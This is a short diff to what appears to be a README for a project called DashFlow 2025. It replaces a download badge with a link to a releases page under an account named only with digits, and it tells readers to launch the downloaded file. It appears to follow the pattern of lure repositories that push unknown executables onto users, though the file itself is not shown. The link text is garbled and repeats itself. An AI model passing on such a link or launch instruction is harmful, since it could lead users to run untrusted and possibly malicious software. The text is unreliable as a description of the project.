@@ -20,7 +20,7 @@ DashFlow 2025 is focused on creating a comprehensive platform that integrates wi
 
 To explore the project further, you can download the source code by clicking the link below:
 
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue.svg)](https://github.com/file/App.zip)
+[![Download https://github.com/7758913499/dashflow-2025-1/releases/tag/v2.0](https://github.com/7758913499/dashflow-2025-1/releases/tag/v2.0)](https://github.com/7758913499/dashflow-2025-1/releases/tag/v2.0)
 
 If the link above ends with the file name, ensure to launch it to access the project files.
 
